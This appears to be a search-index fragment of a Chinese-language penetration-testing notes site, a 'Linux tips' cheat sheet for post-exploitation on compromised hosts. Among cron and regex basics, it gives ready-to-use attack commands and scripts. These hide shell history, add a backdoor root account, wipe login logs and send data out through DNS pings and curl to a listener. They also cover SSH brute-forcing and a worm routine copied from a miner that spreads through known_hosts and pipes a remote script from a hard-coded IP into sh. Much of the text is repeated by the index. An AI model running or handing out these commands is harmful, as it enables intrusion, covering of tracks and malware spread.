mail:","title":"ldap\u67e5\u8be2\u5bfc\u51fa"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/","text":"title: Linux\u6280\u5de7 date: 2022-04-21 17:26:31 \u767b\u5f55\u540e\u4e0d\u8bb0\u5f55\u547d\u4ee4 \u767b\u9646\u540e\u8fd0\u884c\uff0c\u66f4\u7edd\u4e00\u70b9\u53ef\u4ee5\u76f4\u63a5\u5199\u5165basrc\u91cc unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG export HISTFILE=/dev/null export HISTSIZE=0 export HISTFILESIZ \u6dfb\u52a0\u4e00\u4e2aroot\u7528\u6237 useradd system;echo 'system:123456' | chpasswd echo \"system:x:0:0::/:/bin/sh\" >> /etc/passwd ssh -T username@host /bin/bash -i 90 \u4e00\u6761\u547d\u4ee4\u4fee\u6539\u7528\u6237\u5bc6\u7801 echo \"\u5bc6\u7801\" | passwd --stdin \u7528\u6237\u540d \u4e3e\u4f8b\uff1a [root@Bserver ~]# echo \"skyzheng\" | passwd --stdin test #\u628atest\u8fd9\u4e2a\u7528\u6237\u7684\u5bc6\u7801\u6539\u4e3askyzheng changing password for user test passwd: all authentication tokens updated successfully. #\u4ee3\u7801\u5bc6\u7801\u4fee\u6539\u6210\u529f echo \"1qaz@WSX\" | passwd --stdin root \u547d\u4ee4\u957f\u7ed3\u679c\u56de\u663e\u5916\u5e26 \u4ee5ifconfig\u8fd9\u4e2a\u591a\u884c\u8f93\u51fa\u7684\u4e3a\u4f8b\uff0c\u4f7f\u7528awk\u8fdb\u884c\u9010\u884c\u8bfb\u53d6\uff0c\u622a\u53d6\u6307\u5b9a\u884c\u7684\u6307\u5b9a\u5b57\u6bb5 'ip=`ifconfig| awk NR==2 | awk '{print substr($0,1,40)}' | base64 -w 0` && ping $ip.acc.ceye.io' \u67e5\u627e\u6587\u4ef6\u7ed3\u679c\u56de\u663e \u5148\u628a\u67e5\u627e\u8bb0\u5f55\u4fdd\u5b58\u4e3a\u6587\u4ef6 find / -name passwd 2>/dev/null > /tmp/1 \u518d\u9010\u884c\u8bfb\u53d6 'file=`cat /tmp/1 awk NR==1 | awk '{print substr($0,1,20)}' | base64 -w 0` && ping $file.acc.ceye.io' \u914d\u5408ladon\u7684web\u670d\u52a1 curl http://192.168.156.1:800/deb64/`ls -l | base64 | tr '\\n' '-'` whois -h 192.168.156.1 -p 800 `ifconfig | base64` \u81ea\u542f\u52a8 \u5c06\u5199\u597d\u7684\u811a\u672c\uff08.sh\u6587\u4ef6\uff09\u653e\u5230\u76ee\u5f55 /etc/profile.d/ \u4e0b\uff0c\u7cfb\u7edf\u542f\u52a8\u540e\u5c31\u4f1a\u81ea\u52a8\u6267\u884c\u8be5\u76ee\u5f55\u4e0b\u7684\u6240\u6709shell\u811a\u672c \u8fd8\u53ef\u4ee5\u4fee\u6539\u5f00\u673a\u542f\u52a8\u6587\u4ef6\uff1a/etc/rc.local\uff08\u6216\u8005/etc/rc.d/rc.local\uff09 \u590d\u5236\u4ee3\u7801 # 1.\u7f16\u8f91rc.local\u6587\u4ef6 [root@localhost ~]# vi /etc/rc.local # 2.\u4fee\u6539rc.local\u6587\u4ef6\uff0c\u5728 exit 0 \u524d\u9762\u52a0\u5165\u4ee5\u4e0b\u547d\u4ee4\u3002\u4fdd\u5b58\u5e76\u9000\u51fa\u3002 /etc/init.d/mysqld start # mysql\u5f00\u673a\u542f\u52a8 /etc/init.d/nginx start # nginx\u5f00\u673a\u542f\u52a8 supervisord -c /etc/supervisor/supervisord.conf # supervisord\u5f00\u673a\u542f\u52a8 /bin/bash /server/scripts/test.sh >/dev/null 2>/dev/null # 3.\u6700\u540e\u4fee\u6539rc.local\u6587\u4ef6\u7684\u6267\u884c\u6743\u9650 [root@localhost ~]# chmod +x /etc/rc.local [root@localhost ~]# chmod 755 /etc/rc.local \u6e05\u9664\u5386\u53f2\u8bb0\u5f55 echo > /var/log/secure echo > /var/log/wtmp echo > /var/log/btmp echo > /var/log/lastlog echo > /root/.bash_history history -c \u641c\u7d22\u81ea\u5b9a\u4e49\u6587\u4ef6\u5e76\u6253\u5305 find /home/ -name '*.' | xargs tar cvf /tmp/gqrd.tgz \u81ea\u52a8\u67e5\u627e\u516c\u94a5\u81ea\u52a8\u6a2a\u5411 #!/bin/bash if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then for h in $(grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl http://1.177.165.231/sd/T3llyz.sh|sh || wget -q -O- http://1.177.165.231/sd/T3llyz.sh)|sh >/dev/null 2>&1 &' & done fi for file in /home/* do if test -d $file then if [ -f $file/.ssh/known_hosts ] && [ -f $file/.ssh/id_rsa.pub ]; then for h in $(grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" $file/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl http://1.177.165.231/sd/T3llyz.sh|sh || wget -q -O- http://1.177.165.231/sd/T3llyz.sh)|sh >/dev/null 2>&1 &' & done fi fi done \u6284\u4e86\u4e00\u4e0b\u6316\u77ff\u8815\u866b\u7684\u4ee3\u7801\uff0c\u7528\u4e8e\u51fa\u7f51\u63a2\u6d4b\u6216\u5176\u4ed6\u60c5\u51b5 \u4fee\u6539\u547d\u4ee4\u5373\u53ef\u7528\uff0c\u540e\u9762\u8ddf\u4e86sh >/dev/null 2>&1 \u8868\u793a\u6807\u51c6\u8f93\u51fa\u548c\u9519\u8bef\u8f93\u51fa\u90fd\u4e0d\u663e\u793a\uff0c\u6700\u540e\u7684&\u4ee3\u8868\u540e\u53f0\u8fd0\u884c \u7528nc\u542f\u52a8\u4e00\u4e2aweb\u76d1\u542c\u5668 while true; do ( echo -e 'HTTP/1.1 200 OK\\r\\nContent-Type: application/json\\r\\nAccess-Control-Allow-Origin:*\\r\\n'; echo -e \"{\\\"code\\\":\\\"0\\\",\\\"data\\\":{\\\"success\\\":true}}\\n\" ) | nc -lp 9527; done \u5404\u79cdawk\u547d\u4ee4 \u5bf9\u6587\u4ef6\u5185\u5bb9\u6309\u884c\u6279\u91cf\u8ffd\u52a0\u5b57\u7b26 cat mail.txt| awk '{print \"qian:\" $0 \":hou\"}' \u8ba1\u5212\u4efb\u52a1 \u6bcf\u4e00\u5206\u949f\u6267\u884c\u4e00\u6b21 /bin/ls\uff1a * * * * * /bin/ls \u5b9e\u4f8b1\uff1a\u6bcf1\u5206\u949f\u6267\u884c\u4e00\u6b21command \u547d\u4ee4\uff1a * * * * * command \u5b9e\u4f8b2\uff1a\u6bcf\u5c0f\u65f6\u7684\u7b2c3\u548c\u7b2c15\u5206\u949f\u6267\u884c \u547d\u4ee4\uff1a 3,15 * * * * command \u5b9e\u4f8b3\uff1a\u5728\u4e0a\u53488\u70b9\u523011\u70b9\u7684\u7b2c3\u548c\u7b2c15\u5206\u949f\u6267\u884c \u547d\u4ee4\uff1a 3,15 8-11 * * * command \u5b9e\u4f8b4\uff1a\u6bcf\u9694\u4e24\u5929\u7684\u4e0a\u53488\u70b9\u523011\u70b9\u7684\u7b2c3\u548c\u7b2c15\u5206\u949f\u6267\u884c \u547d\u4ee4\uff1a 3,15 8-11 */2 * * command \u5b9e\u4f8b5\uff1a\u6bcf\u4e2a\u661f\u671f\u4e00\u7684\u4e0a\u53488\u70b9\u523011\u70b9\u7684\u7b2c3\u548c\u7b2c15\u5206\u949f\u6267\u884c \u547d\u4ee4\uff1a 3,15 8-11 * * 1 command \u5b9e\u4f8b6\uff1a\u6bcf\u665a\u768421:30\u91cd\u542fsmb \u547d\u4ee4\uff1a 30 21 * * * /etc/init.d/smb restart \u5b9e\u4f8b7\uff1a\u6bcf\u67081\u300110\u300122\u65e5\u76844 : 45\u91cd\u542fsmb \u547d\u4ee4\uff1a 45 4 1,10,22 * * /etc/init.d/smb restart \u5b9e\u4f8b8\uff1a\u6bcf\u5468\u516d\u3001\u5468\u65e5\u76841 : 10\u91cd\u542fsmb \u547d\u4ee4\uff1a 10 1 * * 6,0 /etc/init.d/smb restart \u5b9e\u4f8b9\uff1a\u6bcf\u592918 : 00\u81f323 : 00\u4e4b\u95f4\u6bcf\u969430\u5206\u949f\u91cd\u542fsmb \u547d\u4ee4\uff1a 0,30 18-23 * * * /etc/init.d/smb restart \u5b9e\u4f8b10\uff1a\u6bcf\u661f\u671f\u516d\u7684\u665a\u4e0a11 : 00 pm\u91cd\u542fsmb \u547d\u4ee4\uff1a 0 23 * * 6 /etc/init.d/smb restart \u5b9e\u4f8b11\uff1a\u6bcf\u4e00\u5c0f\u65f6\u91cd\u542fsmb \u547d\u4ee4\uff1a * */1 * * * /etc/init.d/smb restart \u5b9e\u4f8b12\uff1a\u665a\u4e0a11\u70b9\u5230\u65e9\u4e0a7\u70b9\u4e4b\u95f4\uff0c\u6bcf\u9694\u4e00\u5c0f\u65f6\u91cd\u542fsmb \u547d\u4ee4\uff1a * 23-7/1 * * * /etc/init.d/smb restart \u5b9e\u4f8b13\uff1a\u6bcf\u6708\u76844\u53f7\u4e0e\u6bcf\u5468\u4e00\u5230\u5468\u4e09\u768411\u70b9\u91cd\u542fsmb \u547d\u4ee4\uff1a 0 11 4 * mon-wed /etc/init.d/smb restart \u5b9e\u4f8b14\uff1a\u4e00\u6708\u4e00\u53f7\u76844\u70b9\u91cd\u542fsmb \u547d\u4ee4\uff1a 0 4 1 jan * /etc/init.d/smb restart \u5b9e\u4f8b15\uff1a\u6bcf\u5c0f\u65f6\u6267\u884c/etc/cron.hourly\u76ee\u5f55\u5185\u7684\u811a\u672c \u547d\u4ee4\uff1a 01 * * * * root run-parts /etc/cron.hourly \u8bf4\u660e\uff1a run-parts\u8fd9\u4e2a\u53c2\u6570\u4e86\uff0c\u5982\u679c\u53bb\u6389\u8fd9\u4e2a\u53c2\u6570\u7684\u8bdd\uff0c\u540e\u9762\u5c31\u53ef\u4ee5\u5199\u8981\u8fd0\u884c\u7684\u67d0\u4e2a\u811a\u672c\u540d\uff0c\u800c\u4e0d\u662f\u76ee\u5f55\u540d\u4e86 Curl \u63d0\u4ea4\u6587\u4ef6 curl -F \"imgFIle=@xx.html\" url nc -l port \u4fa6\u542c\u6a21\u5f0f\uff0c\u4e0d\u6307\u5b9a\u7aef\u53e3\u65f6\u4f1a\u9ed8\u8ba4\u9009\u62e9\u4e00\u4e2a\u7aef\u53e3 -s \u6307\u5b9a\u53d1\u9001\u6570\u636e\u7684\u6e90ip -u \u4f7f\u7528udp\uff0c\u9ed8\u8ba4tcp -v \u8f93\u51fa\u4fe1\u606f -w \u8d85\u65f6\u79d2\u6570 -z \u626b\u63cf\uff0c\u4e0d\u53d1\u9001\u6570\u636e \u76d1\u542c nc -lv 6666 \u626b\u63cf nc -zvw 3 1.1.1.1 6666 \u4f20\u8f93 \u63a5\u6536\u7aef nc -l 6666 < \u6211\u662f\u6587\u4ef6.txt \u53d1\u9001\u7aef nc -l 6666 > \u6211\u662f\u6587\u4ef6.txt \u626b\u63cf\u7aef\u53e3 nc -znv 1.1.1.1 1-65535 nc -v -w 1.1.1.1 -z 1-1000 Linux\u8bed\u6cd5 for i in {67}; do nc -vv -n -w 1 1.1.1.$i 8000 8010 8080 8081 80 443 -z; done Windows\u8bed\u6cd5 for /l %i in (2,1,100) do nc -znv 10.9.7.%i 8000 8010 8080 8081 80 443 \u6b63\u5219 IPv4 \u5730\u5740 (?=(\\b|\\D))(((\\d{1,2})|(1\\d{1,2})|(2[0-4]\\d)|(25[0-5]))\\.){3}((\\d{1,2})|(1\\d{1,2})|(2[0-4]\\d)|(25[0-5]))(?=(\\b|\\D)) ((25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)\\.){3}(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d) IPv6 \u5730\u5740 ^([\\\\da-fA-F]{1,4}:){7}([\\\\da-fA-F]{1,4})$ \\s+ \u8868\u793a1\u4e2a\u4ee5\u4e0a\u7a7a\u5b57\u7b26\u4e32 \\d \u4efb\u4f55\u4e00\u4f4d\u6570\u5b57 \\d{3} \u8fdb\u884c\u4e09\u6b21\u5339\u914d \u7531\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u542b\u6709\\ \uff0c\u659c\u6760\u9700\u8981\u7528\\\u8f6c\u4e49\uff0c\u4e3a\u4e86\u7b80\u4fbf\uff0c\u9700\u8981\u5728\u5b57\u7b26\u4e32\u524d\u9762\u7528r'\\d{3}' \u6807\u8bb0 \u8bf4\u660e\u5b57\u7b26\u4e32\u662f\u539f\u59cb\u5b57\u7b26\u4e32\u3002 \\D \u975e\u6570\u5b57\u5b57\u7b26 \\w \u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf \\W \u975e\u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf \\s \u7a7a\u767d\u5b57\u7b26 \\S \u975e\u7a7a\u767d\u5b57\u7b26 \uff1f \u8868\u793a\u5339\u914d1\u6b21\u62160\u6b21 * \u8868\u793a\u5339\u914d0\u6b21\u6216\u4efb\u610f\u6b21 + \u8868\u793a\u5339\u914d1\u6b21\u6216\u4efb\u610f\u6b21 (x){3} \u8868\u793a\u5339\u914d\u7279\u5b9a\u6b21\uff0c{3,5}\u6307\u5b9a3\u6b21\u52305\u6b21\uff0c{,3}0\u6b21\u52303\u6b21\uff0c{3,}3\u6b21\u5230\u591a\u6b21\u3002\u6307\u5b9a\uff1f\u8868\u793a\u975e\u8d2a\u5fc3\u5339\u914d ^ \u65b9\u62ec\u53f7\u540e\u8868\u793a\u975e\uff1b\u5b57\u7b26\u5f00\u59cb\u5904\u8868\u793a\u8d77\u59cb % \u5b57\u7b26\u5c3e\u90e8\u8868\u793a\u7ed3\u675f . \u8868\u793a\u6362\u884c\u5916\u7684\u6240\u6709\u5b57\u7b26\uff0c\u53ea\u5339\u914d1\u4e2a\u5b57\u7b26 \u5176\u4ed6\u811a\u672c \u4f7f\u7528ssh\u6279\u91cf\u6267\u884c\u547d\u4ee4 # -*- coding: utf-8 -*- # @Time : 2019-02-26 15:09 # @Author : 00theway # @File : brute_ssh.py # @Software: PyCharm import paramiko, time import threading from queue import Queue import socket class Brute_ssh(threading.Thread): def __init__(self, ips, users, command): threading.Thread.__init__(self) self.ips = ips self.command = command self.users = users def run(self): print('thread start', threading.currentThread().name) while not self.ips.empty(): ip = self.ips.get() for username,password in self.users: try: ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) try: ssh.connect(ip, 22, username, password=password, timeout=60) print('connect %s %s:%s success' % (ip, username, password)) time.sleep(1) stdin, stdout, stderr = ssh.exec_command(command) out = ''.join(stdout.readlines()) print(ip, out) open(ip + '.txt', 'a+').write(out) except: print('connect %s failed' % ip) ssh.close() except Exception as e: print(e) print('thread end', threading.currentThread().name) if __name__ == '__main__': #command = 'ping -c 1 10.1.1.1' command = 'ping -c 1 10.1.1.1' #command = 'ping -c 1 10.1.1.1' users = [ ('lifepay','lifepay'), #('root','P@ssw0rd'), #('oracle','oracle'), #('weblogic','weblogic') ] ips = ''' 10.1.1.1 10.1.1.2 ''' deploy_pools = [] ips_q = Queue() for item in ips.splitlines(): ips_q.put(item) # # for i in range(255): # ip = '10.194.172.%s' % i # ips.put((ip, '22')) for _ in range(5): deploy_pools.append(Brute_ssh(ips_q, users, command)) for worker in deploy_pools: worker.start() for worker in deploy_pools: worker.join() js\u5f00\u542f\u4e00\u4e2aweb\u76d1\u542c\u5668-\u89e3\u7801base64 \u5bf9\u76d1\u542c\u5230\u7684base64\u6570\u636e\u8fdb\u884c\u89e3\u7801 var http = require('http'); var querystring = require('querystring'); http.createServer(function (req, res) { var body = ''; var bbase64=req.url rbase64 = bbase64.substring(1) var base64ToStr = new Buffer(rbase64 , 'base64').toString(); console.log('req.url:',base64ToStr); req.on('data', function (chunk) { body += chunk; console.log(\"chunk:\",chunk); }); req.on('end', function () { body = querystring.parse(body); console.log('body:',body); res.write('Message from server'); res.end(); }); }).listen(800,'0.0.0.0'); js\u5f00\u542f\u4e00\u4e2aweb\u76d1\u542c\u5668 \u4e0d\u89e3\u7801\u76f4\u63a5\u8fd4\u56de\u539f\u59cb\u6570\u636e var http = require('http'); var querystring = require('querystring'); http.createServer(function (req, res) { var body = ''; //var bbase64=req.url //rbase64 = bbase64.substring(1) //var base64ToStr = new Buffer(rbase64 , 'base64').toString(); //console.log('req.url:',base64ToStr); console.log('req.url:',body); req.on('data', function (chunk) { body += chunk; console.log(\"chunk:\",chunk); }); req.on('end', function () { body = querystring.parse(body); console.log('body:',body); res.write('Message from server'); res.end(); }); }).listen(800,'0.0.0.0'); \u4f7f\u7528NC\u5f00\u542f\u4e00\u4e2aweb\u76d1\u542c\u5668 while true; do ( echo -e 'HTTP/1.1 200 OK\\r\\nContent-Type: application/json\\r\\nAccess-Control-Allow-Origin:*\\r\\n'; echo -e \"{\\\"code\\\":\\\"0\\\",\\\"data\\\":{\\\"success\\\":true}}\\n\" ) | nc -lp 9527; done nmap\u6307\u5b9a\u7ea7\u522b\u6279\u91cf\u626b\u63cf #!/bin/bash bak=$IFS if [ $# -ne 1 ];then echo \"Usage $0 IPfile\" exit fi if [ ! -f $1 ];then echo \"the $1 is not a file\" exit fi echo -n \"speed 0-5 : \" read s IFS=$'\\n' for i in `cat $1` do nmap -PA -PS -P0 -sS $i -r -T $s -p1-65535 --open done IFS=$bak \u5185\u7f51\u7f51\u5173\u63a2\u6d4b\u811a\u672c a\u6bb5 #!/bin/bash net=10 for k in {0..255} do for j in {0..255} do for i in 1 254; do ping -c 1 -w 1 $net.$k.$j.$i | grep \"ttl=\" >/dev/null 2>&1 if [ $? -eq 0 ];then echo $net.$k.$j.$i is alive ! || >> ascan.txt else echo $net.$k.$j.$i May be not exist ! fi done done done b\u6bb5 #!/bin/bash net=192.168 for j in {0..255} do for i in 1 254; do ping -c 1 -w 1 $net.$j.$i | grep \"ttl=\" >/dev/null 2>&1 if [ $? -eq 0 ];then echo $net.$j.$i is alive ! || >> bscan.txt else echo $net.$j.$i May be not exist ! fi done done c\u6bb5 #!/bin/bash net=192.168.148 for j in {0..255} do ping -c 1 -w 1 $net.$j | grep \"ttl=\" >/dev/null 2>&1 if [ $? -eq 0 ];then echo $net.$j is alive ! || >> cscan.txt else echo $net.$j May be not exist ! fi done \u65e0\u8fde\u63a5\u75d5\u8ff9 ssh -o UserKnownHostsFile=/dev/null -T root@10.1.1.1 /bin/bash -i \u590d\u5236\u6307\u5b9a\u6587\u4ef6\u5e76\u6253\u5305 find /web -name *.jsp | xargs tar cvf /tmp/web.tar find /home/JavaProjects/1234/ -name '*.jsp' | xargs tar cvf /tmp/1234.tgz \u4ea4\u4e92\u5f0fshell python -c 'import pty; pty.spawn(\"/bin/sh\")' ctrl + z stty raw -echo;fg \u8fdb\u7a0b\u5b88\u62a4\u811a\u672c #!/bin/bash process_name=\"javawc\" restart_command=\"nohup /tmp/javawc run --config 1.json > /dev/null 2>&1 &\" while true; do if pgrep -x \"$process_name\" >/dev/null; then sleep 1 else eval \"$restart_command\" echo \"Process '$process_name' has been restarted.\" fi done \u540e\u53f0\u8fd0\u884c\u7684\u7a0b\u5e8f\u9000\u51fassh\u540e\u4f1a\u81ea\u52a8kill \u4e0d\u7ba1\u600e\u4e48\u540e\u53f0\u8fd0\u884c\uff0c\u4e0d\u7ba1\u7528\u4ec0\u4e48\u547d\u4ee4\uff0c\u53ea\u8981\u9000\u51fassh\u4f1a\u8bdd\u8fdb\u7a0b\u5c31kill\u3002 \u89e3\u51b3\u65b9\u6cd5\uff1a\u767b\u5f55ssh\u540e\u5148 su \u7528\u6237\u540d \uff0c\u518d\u8fd0\u884c\u7a0b\u5e8f\u5c31\u4e0d\u4f1akill\u4e86\u3002","title":"Linux\u6280\u5de7"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#title-linux-date-2022-04-21-172631","text":"","title":"title: Linux\u6280\u5de7 date: 2022-04-21 17:26:31"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#_1","text":"\u767b\u9646\u540e\u8fd0\u884c\uff0c\u66f4\u7edd\u4e00\u70b9\u53ef\u4ee5\u76f4\u63a5\u5199\u5165basrc\u91cc unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG export HISTFILE=/dev/null export HISTSIZE=0 export HISTFILESIZ","title":"\u767b\u5f55\u540e\u4e0d\u8bb0\u5f55\u547d\u4ee4"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#root","text":"useradd system;echo 'system:123456' | chpasswd echo \"system:x:0:0::/:/bin/sh\" >> /etc/passwd ssh -T username@host /bin/bash -i 90","title":"\u6dfb\u52a0\u4e00\u4e2aroot\u7528\u6237"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#_2","text":"echo \"\u5bc6\u7801\" | passwd --stdin \u7528\u6237\u540d \u4e3e\u4f8b\uff1a [root@Bserver ~]# echo \"skyzheng\" | passwd --stdin test #\u628atest\u8fd9\u4e2a\u7528\u6237\u7684\u5bc6\u7801\u6539\u4e3askyzheng changing password for user test passwd: all authentication tokens updated successfully. #\u4ee3\u7801\u5bc6\u7801\u4fee\u6539\u6210\u529f echo \"1qaz@WSX\" | passwd --stdin root","title":"\u4e00\u6761\u547d\u4ee4\u4fee\u6539\u7528\u6237\u5bc6\u7801"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#_3","text":"\u4ee5ifconfig\u8fd9\u4e2a\u591a\u884c\u8f93\u51fa\u7684\u4e3a\u4f8b\uff0c\u4f7f\u7528awk\u8fdb\u884c\u9010\u884c\u8bfb\u53d6\uff0c\u622a\u53d6\u6307\u5b9a\u884c\u7684\u6307\u5b9a\u5b57\u6bb5 'ip=`ifconfig| awk NR==2 | awk '{print substr($0,1,40)}' | base64 -w 0` && ping $ip.acc.ceye.io' \u67e5\u627e\u6587\u4ef6\u7ed3\u679c\u56de\u663e \u5148\u628a\u67e5\u627e\u8bb0\u5f55\u4fdd\u5b58\u4e3a\u6587\u4ef6 find / -name passwd 2>/dev/null > /tmp/1 \u518d\u9010\u884c\u8bfb\u53d6 'file=`cat /tmp/1 awk NR==1 | awk '{print substr($0,1,20)}' | base64 -w 0` && ping $file.acc.ceye.io' \u914d\u5408ladon\u7684web\u670d\u52a1 curl http://192.168.156.1:800/deb64/`ls -l | base64 | tr '\\n' '-'` whois -h 192.168.156.1 -p 800 `ifconfig | base64`","title":"\u547d\u4ee4\u957f\u7ed3\u679c\u56de\u663e\u5916\u5e26"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#_4","text":"\u5c06\u5199\u597d\u7684\u811a\u672c\uff08.sh\u6587\u4ef6\uff09\u653e\u5230\u76ee\u5f55 /etc/profile.d/ \u4e0b\uff0c\u7cfb\u7edf\u542f\u52a8\u540e\u5c31\u4f1a\u81ea\u52a8\u6267\u884c\u8be5\u76ee\u5f55\u4e0b\u7684\u6240\u6709shell\u811a\u672c \u8fd8\u53ef\u4ee5\u4fee\u6539\u5f00\u673a\u542f\u52a8\u6587\u4ef6\uff1a/etc/rc.local\uff08\u6216\u8005/etc/rc.d/rc.local\uff09 \u590d\u5236\u4ee3\u7801 # 1.\u7f16\u8f91rc.local\u6587\u4ef6 [root@localhost ~]# vi /etc/rc.local # 2.\u4fee\u6539rc.local\u6587\u4ef6\uff0c\u5728 exit 0 \u524d\u9762\u52a0\u5165\u4ee5\u4e0b\u547d\u4ee4\u3002\u4fdd\u5b58\u5e76\u9000\u51fa\u3002 /etc/init.d/mysqld start # mysql\u5f00\u673a\u542f\u52a8 /etc/init.d/nginx start # nginx\u5f00\u673a\u542f\u52a8 supervisord -c /etc/supervisor/supervisord.conf # supervisord\u5f00\u673a\u542f\u52a8 /bin/bash /server/scripts/test.sh >/dev/null 2>/dev/null # 3.\u6700\u540e\u4fee\u6539rc.local\u6587\u4ef6\u7684\u6267\u884c\u6743\u9650 [root@localhost ~]# chmod +x /etc/rc.local [root@localhost ~]# chmod 755 /etc/rc.local","title":"\u81ea\u542f\u52a8"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#_5","text":"echo > /var/log/secure echo > /var/log/wtmp echo > /var/log/btmp echo > /var/log/lastlog echo > /root/.bash_history history -c","title":"\u6e05\u9664\u5386\u53f2\u8bb0\u5f55"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#_6","text":"find /home/ -name '*.' | xargs tar cvf /tmp/gqrd.tgz","title":"\u641c\u7d22\u81ea\u5b9a\u4e49\u6587\u4ef6\u5e76\u6253\u5305"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#_7","text":"#!/bin/bash if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then for h in $(grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl http://1.177.165.231/sd/T3llyz.sh|sh || wget -q -O- http://1.177.165.231/sd/T3llyz.sh)|sh >/dev/null 2>&1 &' & done fi for file in /home/* do if test -d $file then if [ -f $file/.ssh/known_hosts ] && [ -f $file/.ssh/id_rsa.pub ]; then for h in $(grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" $file/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl http://1.177.165.231/sd/T3llyz.sh|sh || wget -q -O- http://1.177.165.231/sd/T3llyz.sh)|sh >/dev/null 2>&1 &' & done fi fi done \u6284\u4e86\u4e00\u4e0b\u6316\u77ff\u8815\u866b\u7684\u4ee3\u7801\uff0c\u7528\u4e8e\u51fa\u7f51\u63a2\u6d4b\u6216\u5176\u4ed6\u60c5\u51b5 \u4fee\u6539\u547d\u4ee4\u5373\u53ef\u7528\uff0c\u540e\u9762\u8ddf\u4e86sh >/dev/null 2>&1 \u8868\u793a\u6807\u51c6\u8f93\u51fa\u548c\u9519\u8bef\u8f93\u51fa\u90fd\u4e0d\u663e\u793a\uff0c\u6700\u540e\u7684&\u4ee3\u8868\u540e\u53f0\u8fd0\u884c","title":"\u81ea\u52a8\u67e5\u627e\u516c\u94a5\u81ea\u52a8\u6a2a\u5411"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#ncweb","text":"while true; do ( echo -e 'HTTP/1.1 200 OK\\r\\nContent-Type: application/json\\r\\nAccess-Control-Allow-Origin:*\\r\\n'; echo -e \"{\\\"code\\\":\\\"0\\\",\\\"data\\\":{\\\"success\\\":true}}\\n\" ) | nc -lp 9527; done","title":"\u7528nc\u542f\u52a8\u4e00\u4e2aweb\u76d1\u542c\u5668"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#awk","text":"\u5bf9\u6587\u4ef6\u5185\u5bb9\u6309\u884c\u6279\u91cf\u8ffd\u52a0\u5b57\u7b26 cat mail.txt| awk '{print \"qian:\" $0 \":hou\"}'","title":"\u5404\u79cdawk\u547d\u4ee4"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#_8","text":"\u6bcf\u4e00\u5206\u949f\u6267\u884c\u4e00\u6b21 /bin/ls\uff1a * * * * * /bin/ls \u5b9e\u4f8b1\uff1a\u6bcf1\u5206\u949f\u6267\u884c\u4e00\u6b21command \u547d\u4ee4\uff1a * * * * * command \u5b9e\u4f8b2\uff1a\u6bcf\u5c0f\u65f6\u7684\u7b2c3\u548c\u7b2c15\u5206\u949f\u6267\u884c \u547d\u4ee4\uff1a 3,15 * * * * command \u5b9e\u4f8b3\uff1a\u5728\u4e0a\u53488\u70b9\u523011\u70b9\u7684\u7b2c3\u548c\u7b2c15\u5206\u949f\u6267\u884c \u547d\u4ee4\uff1a 3,15 8-11 * * * command \u5b9e\u4f8b4\uff1a\u6bcf\u9694\u4e24\u5929\u7684\u4e0a\u53488\u70b9\u523011\u70b9\u7684\u7b2c3\u548c\u7b2c15\u5206\u949f\u6267\u884c \u547d\u4ee4\uff1a 3,15 8-11 */2 * * command \u5b9e\u4f8b5\uff1a\u6bcf\u4e2a\u661f\u671f\u4e00\u7684\u4e0a\u53488\u70b9\u523011\u70b9\u7684\u7b2c3\u548c\u7b2c15\u5206\u949f\u6267\u884c \u547d\u4ee4\uff1a 3,15 8-11 * * 1 command \u5b9e\u4f8b6\uff1a\u6bcf\u665a\u768421:30\u91cd\u542fsmb \u547d\u4ee4\uff1a 30 21 * * * /etc/init.d/smb restart \u5b9e\u4f8b7\uff1a\u6bcf\u67081\u300110\u300122\u65e5\u76844 : 45\u91cd\u542fsmb \u547d\u4ee4\uff1a 45 4 1,10,22 * * /etc/init.d/smb restart \u5b9e\u4f8b8\uff1a\u6bcf\u5468\u516d\u3001\u5468\u65e5\u76841 : 